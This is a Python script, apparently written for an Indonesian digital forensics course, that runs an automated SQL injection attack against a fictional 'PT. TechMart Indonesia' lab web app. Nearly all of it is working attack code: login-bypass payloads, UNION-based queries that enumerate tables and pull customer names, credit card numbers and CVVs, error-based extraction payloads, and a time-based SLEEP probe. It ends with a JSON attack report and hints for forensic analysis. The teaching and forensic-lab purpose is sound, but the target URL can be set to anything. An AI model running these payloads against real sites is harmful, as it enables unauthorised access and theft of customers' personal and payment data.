#!/usr/bin/env python3
"""
SQL Injection Attack Simulation
PT. TechMart Indonesia - Educational Purpose

DISCLAIMER: This script is for EDUCATIONAL PURPOSES ONLY!
Only use on systems you have permission to test.

Materi: CPMK-6 - Forensik Digital & Manajemen Risiko
Demonstrasi: Serangan SQL Injection dan dampaknya
"""

import requests
import sys
import json
import time
from datetime import datetime
from urllib.parse import urljoin
import re

# ANSI Colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║{Colors.YELLOW}  💉 SQL INJECTION SIMULATOR - Forensik Digital               {Colors.RED}║
║{Colors.CYAN}     PT. TechMart Indonesia - Educational Purpose Only        {Colors.RED}║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)

class SQLInjectionSimulator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.attack_log = []
        self.successful_payloads = []
        
    def log(self, message, level="info"):
        colors = {
            "info": Colors.CYAN,
            "success": Colors.GREEN,
            "warning": Colors.YELLOW,
            "error": Colors.RED,
            "attack": Colors.PURPLE
        }
        color = colors.get(level, Colors.RESET)
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        print(f"{Colors.BOLD}[{timestamp}]{Colors.RESET} {color}{message}{Colors.RESET}")
        self.attack_log.append({
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": message
        })
    
    def test_authentication_bypass(self):
        """
        Test SQL Injection untuk bypass authentication
        Teknik: Manipulasi query WHERE clause
        """
        self.log("\n[ATTACK 1] Testing Authentication Bypass SQL Injection", "attack")
        self.log("=" * 60, "info")
        
        login_url = urljoin(self.target_url, "login.php")
        
        # Common SQL Injection payloads untuk authentication bypass
        payloads = [
            # Basic authentication bypass
            {"username": "' OR '1'='1", "password": "anything"},
            {"username": "admin'--", "password": "anything"},
            {"username": "admin' #", "password": "anything"},
            {"username": "' OR 1=1--", "password": "anything"},
            {"username": "' OR '1'='1'--", "password": "anything"},
            
            # Using comments
            {"username": "admin'/*", "password": "*/--"},
            
            # Boolean-based
            {"username": "' OR 1=1 OR '1'='1", "password": "x"},
            
            # Using specific username
            {"username": "admin' AND '1'='1", "password": "x' OR '1'='1"},
        ]
        
        successful = []
        
        for i, payload in enumerate(payloads, 1):
            self.log(f"\n[Attempt {i}/{len(payloads)}]", "info")
            self.log(f"  Username: {payload['username']}", "info")
            self.log(f"  Password: {payload['password']}", "info")
            
            try:
                response = self.session.post(login_url, data=payload, allow_redirects=False, timeout=10)
                
                # Check for successful login indicators
                if response.status_code == 302:  # Redirect to dashboard
                    self.log(f"  [✓] SUCCESS! Authentication bypassed!", "success")
                    successful.append(payload)
                    self.successful_payloads.append({
                        "type": "auth_bypass",
                        "payload": payload,
                        "response_code": response.status_code
                    })
                elif "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                    self.log(f"  [✓] SUCCESS! Authentication bypassed!", "success")
                    successful.append(payload)
                else:
                    self.log(f"  [-] Failed (Status: {response.status_code})", "warning")
                    
            except Exception as e:
                self.log(f"  [!] Error: {e}", "error")
            
            time.sleep(0.5)  # Rate limiting
        
        self.log(f"\n[RESULT] {len(successful)}/{len(payloads)} payloads successful", "success" if successful else "warning")
        return successful
    
    def test_union_injection(self):
        """
        Test UNION-based SQL Injection
        Teknik: Menggunakan UNION SELECT untuk extract data
        """
        self.log("\n[ATTACK 2] Testing UNION-based SQL Injection", "attack")
        self.log("=" * 60, "info")
        
        search_url = urljoin(self.target_url, "search_customers.php")
        
        # Step 1: Determine number of columns
        self.log("\n[Step 1] Determining number of columns...", "info")
        
        for num_cols in range(1, 15):
            null_list = ", ".join(["NULL"] * num_cols)
            payload = f"' UNION SELECT {null_list}-- -"
            
            try:
                response = self.session.get(search_url, params={"q": payload}, timeout=10)
                if "error" not in response.text.lower() and response.status_code == 200:
                    self.log(f"  [✓] Found {num_cols} columns!", "success")
                    break
            except:
                pass
        
        # Step 2: Extract database info
        self.log("\n[Step 2] Extracting database information...", "info")
        
        info_payloads = [
            ("Database Version", f"' UNION SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL-- -"),
            ("Current Database", f"' UNION SELECT NULL,database(),NULL,NULL,NULL,NULL,NULL,NULL-- -"),
            ("Current User", f"' UNION SELECT NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL-- -"),
        ]
        
        extracted_info = {}
        for name, payload in info_payloads:
            try:
                response = self.session.get(search_url, params={"q": payload}, timeout=10)
                self.log(f"  [+] {name}: Query sent", "info")
                # In real scenario, would parse response for the extracted data
                extracted_info[name] = "See response"
            except:
                pass
        
        # Step 3: Extract table names
        self.log("\n[Step 3] Extracting table names...", "info")
        
        table_payload = "' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -"
        try:
            response = self.session.get(search_url, params={"q": table_payload}, timeout=10)
            self.log(f"  [+] Table extraction query sent", "success")
            self.successful_payloads.append({
                "type": "union_injection",
                "payload": table_payload,
                "target": "table_names"
            })
        except:
            pass
        
        # Step 4: Extract sensitive data from customers table
        self.log("\n[Step 4] Extracting customer data...", "info")
        
        customer_payload = "' UNION SELECT id,first_name,last_name,email,phone,address,credit_card,cvv FROM customers-- -"
        try:
            response = self.session.get(search_url, params={"q": customer_payload}, timeout=10)
            self.log(f"  [!] Customer data extraction attempted!", "warning")
            self.successful_payloads.append({
                "type": "data_extraction",
                "payload": customer_payload,
                "target": "customer_data"
            })
        except:
            pass
        
        return extracted_info
    
    def test_error_based_injection(self):
        """
        Test Error-based SQL Injection
        Teknik: Menggunakan error messages untuk extract data
        """
        self.log("\n[ATTACK 3] Testing Error-based SQL Injection", "attack")
        self.log("=" * 60, "info")
        
        search_url = urljoin(self.target_url, "search_customers.php")
        
        error_payloads = [
            # MySQL error-based
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            # Trigger syntax error to reveal info
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
        ]
        
        for payload in error_payloads:
            try:
                response = self.session.get(search_url, params={"q": payload}, timeout=10)
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    self.log(f"  [✓] Error-based injection possible!", "success")
                    self.successful_payloads.append({
                        "type": "error_based",
                        "payload": payload
                    })
                    break
            except:
                pass
        
        return True
    
    def test_time_based_injection(self):
        """
        Test Time-based Blind SQL Injection
        Teknik: Menggunakan SLEEP/BENCHMARK untuk confirm injection
        """
        self.log("\n[ATTACK 4] Testing Time-based Blind SQL Injection", "attack")
        self.log("=" * 60, "info")
        
        search_url = urljoin(self.target_url, "search_customers.php")
        
        # Test with SLEEP
        payload = "' OR SLEEP(3)-- -"
        self.log(f"  [*] Sending payload with 3 second delay...", "info")
        
        try:
            start_time = time.time()
            response = self.session.get(search_url, params={"q": payload}, timeout=15)
            elapsed = time.time() - start_time
            
            if elapsed >= 3:
                self.log(f"  [✓] Time-based injection confirmed! (Delay: {elapsed:.2f}s)", "success")
                self.successful_payloads.append({
                    "type": "time_based_blind",
                    "payload": payload,
                    "delay": elapsed
                })
            else:
                self.log(f"  [-] No significant delay detected ({elapsed:.2f}s)", "warning")
        except:
            pass
        
        return True
    
    def generate_attack_report(self):
        """Generate comprehensive attack report"""
        report = {
            "attack_summary": {
                "target": self.target_url,
                "timestamp": datetime.now().isoformat(),
                "total_attacks": len(self.attack_log),
                "successful_payloads": len(self.successful_payloads)
            },
            "successful_payloads": self.successful_payloads,
            "attack_log": self.attack_log
        }
        
        # Save report
        report_file = f"sql_injection_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.log(f"\n[✓] Attack report saved to {report_file}", "success")
        
        # Print summary
        print(f"""
{Colors.BOLD}═══════════════════════════════════════════════════════════════
                 SQL INJECTION ATTACK SUMMARY
═══════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.CYAN}Target:{Colors.RESET} {self.target_url}
{Colors.CYAN}Timestamp:{Colors.RESET} {report['attack_summary']['timestamp']}

{Colors.RED}Attack Results:{Colors.RESET}
  • Authentication Bypass: {'✓ Successful' if any(p['type'] == 'auth_bypass' for p in self.successful_payloads) else '✗ Failed'}
  • UNION Injection: {'✓ Successful' if any(p['type'] == 'union_injection' for p in self.successful_payloads) else '✗ Failed'}
  • Data Extraction: {'✓ Successful' if any(p['type'] == 'data_extraction' for p in self.successful_payloads) else '✗ Failed'}
  • Time-based Blind: {'✓ Successful' if any(p['type'] == 'time_based_blind' for p in self.successful_payloads) else '✗ Failed'}

{Colors.YELLOW}Successful Payloads:{Colors.RESET} {len(self.successful_payloads)}

{Colors.BOLD}═══════════════════════════════════════════════════════════════{Colors.RESET}
        """)
        
        return report
    
    def run_full_attack(self):
        """Run complete SQL injection attack simulation"""
        self.log("Starting SQL Injection Attack Simulation...", "attack")
        
        self.test_authentication_bypass()
        self.test_union_injection()
        self.test_error_based_injection()
        self.test_time_based_injection()
        
        return self.generate_attack_report()


def main():
    banner()
    
    import argparse
    parser = argparse.ArgumentParser(description='SQL Injection Simulator for Forensic Simulation')
    parser.add_argument('--target', '-t', type=str, default='http://172.28.0.10', 
                        help='Target URL (default: http://172.28.0.10)')
    parser.add_argument('target_positional', nargs='?', default=None,
                        help='Target URL (positional argument)')
    
    args = parser.parse_args()
    
    # Use positional argument if provided, otherwise use --target
    target = args.target_positional if args.target_positional else args.target
    
    # Ensure URL has scheme
    if not target.startswith("http"):
        target = f"http://{target}"
    
    print(f"{Colors.BOLD}Target: {target}{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  This is for EDUCATIONAL PURPOSES ONLY!{Colors.RESET}\n")
    
    simulator = SQLInjectionSimulator(target)
    report = simulator.run_full_attack()
    
    print(f"""
{Colors.YELLOW}Forensic Evidence Generated:{Colors.RESET}
1. Attack logs saved to JSON file
2. Server logs will show:
   - Malicious queries in access logs
   - SQL errors in error logs
   - Login attempts in audit table

{Colors.CYAN}Next Steps for Forensic Analysis:{Colors.RESET}
1. Examine /var/log/apache2/access.log (or Docker logs)
2. Check MySQL general query log
3. Review login_attempts table
4. Analyze audit_log table
    """)


if __name__ == "__main__":
    main()
